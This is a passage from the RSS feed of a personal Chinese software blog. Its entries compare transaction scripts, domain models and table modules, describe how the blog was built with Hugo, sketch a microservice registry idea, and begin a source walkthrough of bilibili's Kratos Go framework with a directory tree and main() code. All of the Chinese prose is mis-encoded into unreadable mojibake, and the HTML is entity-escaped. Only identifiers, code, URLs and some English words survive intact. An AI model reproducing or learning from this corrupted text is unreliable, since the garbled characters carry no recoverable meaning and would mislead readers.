å› æ­¤ï¼Œå‘å¸ƒå¯¹è±¡è°ƒç”¨ä¸€æ¬¡å†™å…¥æ–¹æ³•ã€‚
å¯èƒ½è¿˜ä¼šæœ‰å…¶ä»–ä¾‹ç¨‹æ¥å®Œæˆä¸€äº›è¯»å–åŠŸèƒ½ï¼Œä½†å®ƒå…¶å®éƒ½æ˜¯è°ƒç”¨é¢†åŸŸæ¨¡å‹ä¸­å·²æœ‰æ‰“æ–¹æ³•å®ç°çš„ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é¢†åŸŸæ¨¡å‹çš„æ§åˆ¶ä¸å†æ˜¯ç”±ä¸€ä¸ªè¿‡ç¨‹æ¥æ§åˆ¶ç”¨æˆ·æŸä¸€ä¸ªåŠ¨ä½œçš„é€»è¾‘ï¼Œè€Œæ˜¯ç”±æ¯ä¸ªå¯¹è±¡éƒ½æ‰¿æ‹…ä¸€éƒ¨åˆ†ç›¸å…³é€»è¾‘ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é¢†åŸŸæ¨¡å‹çš„å¼€é”€æ¥è‡ªäºæ•°æ®æºçš„å¤æ‚åº¦å’Œä½¿ç”¨ä¸Šçš„å¤æ‚æ€§ï¼Œåˆšåˆšæ¥è§¦é¢†åŸŸæ¨¡å‹çš„äººä¼šéœ€è¦æ—¶é—´æ¥é€‚åº”è¿™ç§æ€ç»´æ–¹å¼ã€‚ä¸€æ—¦ä¹ æƒ¯äº†ï¼Œä½ å°±ä¼šå¾ˆçˆ½ï¼
å¦ä¸€æ–¹é¢ä½ éœ€è¦å°†æ•°æ®æºæ˜ å°„åˆ°é¢†åŸŸæ¨¡å‹ä¸Šï¼Œæ•°æ®æºè¶Šæ˜¯å¤æ‚ï¼Œé¢†åŸŸæ¨¡å‹çš„æ•ˆæœå°±è¶Šæ˜¯æ˜¾è‘—ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/shiwujiaoben.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šä¸ºäº‹åŠ¡è„šæœ¬&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/lingyumoxing.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šä¸ºé¢†åŸŸæ¨¡å‹&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸‰ä¸­ä¸ºé¢†åŸŸé€»è¾‘çš„ç»„ç»‡æ¨¡å¼ä¸º&lt;code&gt;è¡¨æ¨¡å—&lt;/code&gt;ï¼Œå®ƒå¤„äº&lt;code&gt;äº‹åŠ¡è„šæœ¬&lt;/code&gt;å’Œ&lt;code&gt;é¢†åŸŸæ¨¡å‹&lt;/code&gt;çš„ä¸€ä¸ªä¸­é—´åœ°å¸¦ã€‚
å’Œé¢†åŸŸæ¨¡å‹æœ€å¤§çš„åŒºåˆ«å°±æ˜¯åœ¨è¡¨æ¨¡å—ä¸­ä¸€ä¸ªè¡¨åªå¯¹åº”ä¸€ä¸ªå®ä¾‹ï¼Œè€Œé¢†åŸŸæ¨¡å‹ä¸€è¡Œæ•°æ®ä¾¿èƒ½å¯¹åº”ä¸€ä¸ªå®ä¾‹ã€‚&lt;/p&gt;
&lt;p&gt;è¡¨æ¨¡å—çš„ä¼˜ç‚¹åœ¨äºå¯ä»¥å¾ˆå®¹æ˜“çš„å’Œè½¯ä»¶æ¶æ„ä¸­å·²ç»å­˜åœ¨çš„éƒ¨åˆ†è¡”æ¥ï¼Œå¾ˆå¤šGUIåº”ç”¨éƒ½æ˜¯å‡å®šå°†å…¶ä¸SQLæŸ¥è¯¢ç»“æœçš„è®°å½•é›†ç»“æœååŒå·¥ä½œçš„ã€‚è¡¨æ¨¡å—å°±å·¥ä½œåœ¨è®°å½•é›†ä¹‹ä¸Šã€‚ä½ å¯ä»¥å¾ˆå®¹æ˜“çš„ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/tablemodule.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;æŠ‰æ‹©&#34;&gt;æŠ‰æ‹©&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/modelfuzadu.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;åˆ«é—®ï¼Œé—®å°±ï¼Œç›´æ¥ä½¿ç”¨é¢†åŸŸæ¨¡å‹ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ç¨å¾®ä»‹ç»ä¸€ä¸‹ç›®å‰å„ä¸ªæ¡†æ¶/åº“åœ¨é¢†åŸŸé€»è¾‘çš„ç»„ç»‡æ¨¡å¼ä¸Šçš„é€‰æ‹©ï¼ˆåªåˆ—å‡ºæˆ‘ç”¨ï¼‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PHP&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP åŸç”Ÿ &amp;lt;äº‹åŠ¡è„šæœ¬&amp;gt;&lt;/li&gt;
&lt;li&gt;ThinkPHP &amp;lt;é¢†åŸŸæ¨¡å‹&amp;gt;&lt;/li&gt;
&lt;li&gt;Laravel &amp;lt;é¢†åŸŸæ¨¡å‹&amp;gt;&lt;/li&gt;
&lt;li&gt;YII &amp;lt;é¢†åŸŸæ¨¡å‹&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java.sql.* &amp;lt;äº‹åŠ¡è„šæœ¬&amp;gt;&lt;/li&gt;
&lt;li&gt;MyBatis &amp;lt;è¡¨æ¨¡å—&amp;gt;&lt;/li&gt;
&lt;li&gt;JPA &amp;lt;é¢†åŸŸæ¨¡å‹&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gorm &amp;lt;è¡¨æ¨¡å— | é¢†åŸŸæ¨¡å‹&amp;gt; ï¼ˆè¿™ä¸ªæ¯”è¾ƒç¥å¥‡ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç°åœ¨ç”¨è¡¨æ¨¡å—çš„äººæ™®éæ¯”è¾ƒå¤šï¼Œæˆ‘æ›¾é‡åˆ°å¥½å‡ ä¸ªJ2EEå·¥ç¨‹å¸ˆéƒ½å¹¶ä¸å–œæ¬¢&lt;code&gt;JPA&lt;/code&gt;çš„æ€ç»´æ¨¡å¼ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>About the Blog</title>
        <link>https://sdttttt.github.io/p/about-the-blog/</link>
        <pubDate>Fri, 03 Apr 2020 15:36:02 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/about-the-blog/</guid>
        <description>&lt;p&gt;&lt;code&gt;blog&lt;/code&gt;é‡Œçš„æ–‡ç« å¹¶éå…¨éƒ¨åŸåˆ›ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯ç»è¿‡ä¿®æ”¹åæ•´ç†å‡º&lt;code&gt;è¦ç‚¹&lt;/code&gt;ï¼Œé›†ä¸­ä¸€èµ·å†™åˆ°è¿™é‡Œé¢ã€‚ä¹ŸåŒ…æ¶µäº†ä¸€äº›æˆ‘å¯¹æ•´ä¸ªè½¯ä»¶è¡Œä¸šçš„æƒ³æ³•ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;è¿™ä¸ª&lt;code&gt;blog&lt;/code&gt;æ˜¯ç”¨&lt;code&gt;Hugo&lt;/code&gt;æ„å»ºçš„ï¼ŒThemeä½¿ç”¨çš„æ˜¯&lt;code&gt;rocinante&lt;/code&gt;,live2Dçš„çº¸ç‰‡äººæ˜¯æˆ‘è‡ªå·±åŠ çš„.(ä¸æ˜¯ä¸»é¢˜é‡Œè‡ªå¸¦çš„).&lt;/p&gt;
&lt;p&gt;æˆ‘ä¹‹å‰è¿˜ä½¿ç”¨è¿‡&lt;code&gt;Vuepress&lt;/code&gt;åšä¸ºé™æ€ç½‘ç«™ç”Ÿæˆå™¨ï¼Œä¸è¿‡è‡ªå®šä¹‰ç¨‹åº¦å¾ˆä½ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¤åˆæˆ‘çš„å®¡ç¾ã€‚ï¼ˆæˆ‘å¸Œæœ›æ˜¯æ—è¾¹ä¸è¦å‡ºç°ç›®å½•æ ï¼‰&lt;/p&gt;
&lt;p&gt;åé¢æˆ‘å°±è½¬æˆ˜&lt;code&gt;Hugo&lt;/code&gt;,ä¼˜ç‚¹ï¼šç”¨Goç¼–å†™ï¼Œç”Ÿæˆå¿«ã€‚ç”Ÿæ€åœˆä¹Ÿæ¯”è¾ƒè‰¯å¥½ã€‚æˆ‘ç¬¬ä¸€ä¸ªä½¿ç”¨çš„Themeæ˜¯&lt;code&gt;book&lt;/code&gt;ï¼Œä¸å¾—ä¸è¯´ï¼Œé…ç½®å¤æ‚ï¼Œæˆ‘å°±é©¬ä¸Šä¸¢å¼ƒäº†ï¼Œåé¢åˆä½¿ç”¨äº†&lt;code&gt;Ezhi&lt;/code&gt;ï¼Œç”±äºæˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢çº¢è‰²ï¼Œå°±åˆæ‰”äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå°±ä½¿ç”¨äº†ç°åœ¨è¿™ä¸ªThemeï¼Œè¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„ï¼Œå¾ˆæç®€ã€‚åé¢ä¹ŸåŠ äº†&lt;code&gt;utteranc&lt;/code&gt;åšä¸ºè¯„è®ºæ¨¡å—ï¼Œé€‰æ‹©utterancçš„ç†ç”±å¾ˆç®€å•ï¼Œæœ€åˆ&lt;code&gt;Hugo&lt;/code&gt;æ˜¯è‡ªå¸¦&lt;code&gt;Disqus&lt;/code&gt;åšä¸ºè¯„è®ºæ¨¡å—çš„ï¼Œä½†æ˜¯æ— å¥ˆè¿™ä¸ª&lt;code&gt;Disqus&lt;/code&gt;åœ¨å›½å¤–ï¼Œè€Œä¸”è¿˜æ˜¯è¢«å¢™çš„ï¼&lt;/p&gt;
&lt;p&gt;åæ¥æš‚æ—¶æäº†ä¸€æ®µæ—¶é—´ï¼Œæ‰æ‰¾åˆ°&lt;code&gt;utteranc&lt;/code&gt;ï¼Œä¼˜ç‚¹å°±æ˜¯ç»“åˆ&lt;code&gt;Github issues&lt;/code&gt;æ— éœ€ç¿»å¢™ï¼Œä½¿ç”¨çš„UIä¹Ÿæ˜¯Githubçš„ï¼ˆGithubä½¿ç”¨çš„UIæ˜¯Bootstrapåº“ï¼‰ï¼Œè€Œä¸”é›¶é…ç½®ï¼Œæˆæƒä¸€ä¸‹Appï¼Œæ”¹ä¸€ä¸‹JSçš„tagé©¬ä¸Šå°±å¯ä»¥ç”¨ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>åªéœ€è¦æœåŠ¡ä¸­å¿ƒ</title>
        <link>https://sdttttt.github.io/p/%E5%8F%AA%E9%9C%80%E8%A6%81%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83/</link>
        <pubDate>Thu, 02 Apr 2020 15:58:01 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E5%8F%AA%E9%9C%80%E8%A6%81%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83/</guid>
        <description>&lt;p&gt;ç›®å‰ï¼Œå¸‚é¢ä¸Šä»¥åŠå‡ºç°äº†å„ç§å„æ ·çš„é€‚ç”¨äºå¾®æœåŠ¡(ä¸‹é¢ç®€ç§°ms)çš„æ³¨å†Œä¸­å¿ƒï¼Œé…åˆå…¶ä½¿ç”¨çš„è¿˜æœ‰å„ç§msæ¡†æ¶ï¼Œä¾‹å¦‚Alibabaçš„&lt;code&gt;Dubbo&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¾®æœåŠ¡èƒ½é€šè¿‡åˆ†è§£æœåŠ¡ç²’åº¦ï¼Œç„¶åé’ˆå¯¹ç‰¹å®šæœåŠ¡è¿›è¡Œæ€§èƒ½æ‰©å±•ï¼Œæ¥è¾¾åˆ°é«˜æ€§èƒ½çš„ç›®çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœåŠ¡ä¸­å¿ƒè´Ÿè´£æœåŠ¡çš„æ³¨å†Œå’Œç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œ&lt;code&gt;Dubbo&lt;/code&gt;ä¹‹ç±»çš„å¾®æœåŠ¡æ¡†æ¶åˆ™å¯¹æœåŠ¡çš„æ³¨å†Œ, è´Ÿè½½å‡è¡¡ï¼ŒæœåŠ¡é‰´æƒ, æœåŠ¡è°ƒç”¨ç­‰ä¸€ç³»åˆ—æ“ä½œåšå°è£…ï¼Œä¾›ç”¨æˆ·è°ƒç”¨.&lt;/p&gt;
&lt;p&gt;ä½¿å¾—ç”¨æˆ·ä¸ç”¨å»å…³å¿ƒå¾®æœåŠ¡çš„å®ç°ç»†èŠ‚ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æˆ‘çš„æƒ³æ³•ç›¸åï¼Œæˆ–è®¸èƒ½è®©æœåŠ¡ä¸­å¿ƒåšæ›´å¤šçš„äº‹ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä»å¤´ï¼Œå»è®¾è®¡ä¸€ä¸ªæœåŠ¡ä¸­å¿ƒï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åªç®¡ç†æœåŠ¡åå’ŒæœåŠ¡åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;æ¶ˆè´¹ç«¯ç´¢å–æœåŠ¡æ—¶ï¼Œåˆ™ç”±æœåŠ¡ä¸­å¿ƒæ¥åšè´Ÿè½½å‡è¡¡å’Œä¸€äº›é¢å¤–çš„å·¥ä½œï¼Œç›´æ¥ç»™å‡ºæœåŠ¡æä¾›æ–¹åœ°å€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å…¶ä»–çš„åŠŸèƒ½å¯ä»¥æŒ‰ç…§ç°æœ‰çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒæ¥è®¾è®¡ã€‚&lt;/p&gt;
&lt;p&gt;å…³äºå¾®æœåŠ¡çš„è°ƒç”¨ï¼Œåˆ™ç”±æœåŠ¡æ³¨å†Œä¸­å¿ƒæä¾›ä¸€ä¸ªå¾®æœåŠ¡åº“ï¼Œæ¥ä¾›æˆ‘ä»¬è°ƒç”¨ï¼Œæˆ–è€…ç”±ç”¨æˆ·è‡ªå·±å®ç°ã€‚è¿™ä¸ªæ¶æ„ä¸‹ï¼Œå°±ä¸éœ€è¦&lt;code&gt;Dubbo&lt;/code&gt;ä¹‹ç±»çš„RPCæ¡†æ¶ã€‚&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼šæ¨¡å—å‡å°‘ï¼Œå¼€å‘å¯èƒ½ä¼šæˆæœ¬å‡å°‘ã€‚&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ï¼šéœ€è¦æœåŠ¡ä¸­å¿ƒæ¥æä¾›å¾®æœåŠ¡è°ƒç”¨åº“ã€‚ï¼ˆè€Œä¸”æœåŠ¡ä¸­å¿ƒå¤„ç†çš„ä¸œè¥¿å˜å¤šäº†ï¼Œä¸çŸ¥é“æ€§èƒ½ä¼šæœ‰å¤šå°‘å½±å“ï¼‰&lt;/p&gt;
&lt;p&gt;ç›®å‰å°ç”Ÿå·²ç»æäº†ä¸€ä¸ªç±»ä¼¼è¿™ä¸­æœåŠ¡æ³¨å†Œä¸­å¿ƒçš„Demoï¼Œå¯ä»¥å‚è€ƒã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/sdttttt/go-tds&#34;&gt;https://github.com/sdttttt/go-tds&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªæˆ‘çªå‘çš„çµæ„Ÿç½¢äº†ï¼Œå…¶å®æŒºè’å”çš„ã€‚ï¼‰&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Kratos åˆå§‹åŒ–æµç¨‹æºç è§£æ</title>
        <link>https://sdttttt.github.io/p/kratos-%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Tue, 31 Mar 2020 20:17:28 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/kratos-%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;p&gt;&lt;strong&gt;Kratos&lt;/strong&gt; æ˜¯bilibiliå¼€æºçš„ä¸€å¥—Goå¾®æœåŠ¡æ¡†æ¶ï¼ŒåŒ…å«å¤§é‡å¾®æœåŠ¡ç›¸å…³æ¡†æ¶åŠå·¥å…·ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åå­—æ¥æºäº:ã€Šæˆ˜ç¥ã€‹æ¸¸æˆä»¥å¸Œè…Šç¥è¯ä¸ºèƒŒæ™¯ï¼Œè®²è¿°ç”±å‡¡äººæˆä¸ºæˆ˜ç¥çš„å¥æ‰˜æ–¯ï¼ˆKratosï¼‰æˆä¸ºæˆ˜ç¥å¹¶å±•å¼€å¼‘ç¥å± æ€çš„å†’é™©å†ç¨‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¥½ï¼å¼€å§‹å§ï¼&lt;/p&gt;
&lt;p&gt;&lt;em&gt;å°æç¤ºï¼šé˜…è¯»æºç æ—¶è¯·ä¿æŒæ¸…é†’ã€‚&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯æŒ‰ç…§Kratos tool ç”Ÿäº§çš„å·¥ç¨‹ç›®å½•ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;â”œâ”€â”€ CHANGELOG.md 
â”œâ”€â”€ OWNERS
â”œâ”€â”€ README.md
â”œâ”€â”€ api                     # apiç›®å½•ä¸ºå¯¹å¤–ä¿ç•™çš„protoæ–‡ä»¶åŠç”Ÿæˆçš„pb.goæ–‡ä»¶
â”‚   â”œâ”€â”€ api.bm.go
â”‚   â”œâ”€â”€ api.pb.go           # é€šè¿‡go generateç”Ÿæˆçš„pb.goæ–‡ä»¶
â”‚   â”œâ”€â”€ api.proto
â”‚   â””â”€â”€ client.go
â”œâ”€â”€ cmd
â”‚   â””â”€â”€ main.go             # cmdç›®å½•ä¸ºmainæ‰€åœ¨
â”œâ”€â”€ configs                 # configsä¸ºé…ç½®æ–‡ä»¶ç›®å½•
â”‚   â”œâ”€â”€ application.toml    # åº”ç”¨çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ä¸€äº›ä¸šåŠ¡å¼€å…³å¦‚ï¼šuseABtest = true
â”‚   â”œâ”€â”€ db.toml             # dbç›¸å…³é…ç½®
â”‚   â”œâ”€â”€ grpc.toml           # grpcç›¸å…³é…ç½®
â”‚   â”œâ”€â”€ http.toml           # httpç›¸å…³é…ç½®
â”‚   â”œâ”€â”€ memcache.toml       # memcacheç›¸å…³é…ç½®
â”‚   â””â”€â”€ redis.toml          # redisç›¸å…³é…ç½®
â”œâ”€â”€ go.mod
â”œâ”€â”€ go.sum
â””â”€â”€ internal                # internalä¸ºé¡¹ç›®å†…éƒ¨åŒ…ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ç›®å½•ï¼š
â”‚   â”œâ”€â”€ dao                 # daoå±‚ï¼Œç”¨äºæ•°æ®åº“ã€cacheã€MQã€ä¾èµ–æŸä¸šåŠ¡grpc|httpç­‰èµ„æºè®¿é—®
â”‚   â”‚   â”œâ”€â”€ dao.bts.go
â”‚   â”‚   â”œâ”€â”€ dao.go
â”‚   â”‚   â”œâ”€â”€ db.go
â”‚   â”‚   â”œâ”€â”€ mc.cache.go
â”‚   â”‚   â”œâ”€â”€ mc.go
â”‚   â”‚   â””â”€â”€ redis.go
â”‚   â”œâ”€â”€ di                  # ä¾èµ–æ³¨å…¥å±‚ é‡‡ç”¨wireé™æ€åˆ†æä¾èµ–
â”‚   â”‚   â”œâ”€â”€ app.go
â”‚   â”‚   â”œâ”€â”€ wire.go         # wire å£°æ˜
â”‚   â”‚   â””â”€â”€ wire_gen.go     # go generate ç”Ÿæˆçš„ä»£ç 
â”‚   â”œâ”€â”€ model               # modelå±‚ï¼Œç”¨äºå£°æ˜ä¸šåŠ¡ç»“æ„ä½“
â”‚   â”‚   â””â”€â”€ model.go
â”‚   â”œâ”€â”€ server              # serverå±‚ï¼Œç”¨äºåˆå§‹åŒ–grpcå’Œhttp server
â”‚   â”‚   â”œâ”€â”€ grpc            # grpcå±‚ï¼Œç”¨äºåˆå§‹åŒ–grpc serverå’Œå®šä¹‰method
â”‚   â”‚   â”‚   â””â”€â”€ server.go
â”‚   â”‚   â””â”€â”€ http            # httpå±‚ï¼Œç”¨äºåˆå§‹åŒ–http serverå’Œå£°æ˜handler
â”‚   â”‚       â””â”€â”€ server.go
â”‚   â””â”€â”€ service             # serviceå±‚ï¼Œç”¨äºä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œä¸”ä¸ºæ–¹ä¾¿httpå’Œgrpcå…±ç”¨æ–¹æ³•ï¼Œå»ºè®®å…¥å‚å’Œå‡ºå‚ä¿æŒgrpcé£æ ¼ï¼Œä¸”ä½¿ç”¨pbæ–‡ä»¶ç”Ÿæˆä»£ç 
â”‚       â””â”€â”€ service.go
â””â”€â”€ test                    # æµ‹è¯•èµ„æºå±‚ ç”¨äºå­˜æ”¾æµ‹è¯•ç›¸å…³èµ„æºæ•°æ® å¦‚docker-composeé…ç½® æ•°æ®åº“åˆå§‹åŒ–è¯­å¥ç­‰
    â””â”€â”€ docker-compose.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;entry&#34;&gt;Entry&lt;/h2&gt;
&lt;p&gt;å…¥å£åœ¨&lt;code&gt;cmd/main.go&lt;/code&gt;ä¸‹ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå‚æ•°è§£æ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// debug flag: log.dir={path}
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;kratos-demo start&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// -conf å‚æ•°çš„è§£æ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// è¿™é‡Œæ˜¯ `æ·±å‘çš„å…¥å£`
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// ä¸€ä¼šåˆ†æ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;closeFunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;di&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;InitApp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;panic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// os.Signal æ˜¯ä¸€ä¸ªç³»ç»Ÿä¿¡å·æ¥æ”¶channel
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;chan&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Signal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// syscall éƒ½æ˜¯ä¸€äº›ç³»ç»Ÿä¿¡å·
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Notify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGHUP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGQUIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGTERM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SIGINT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
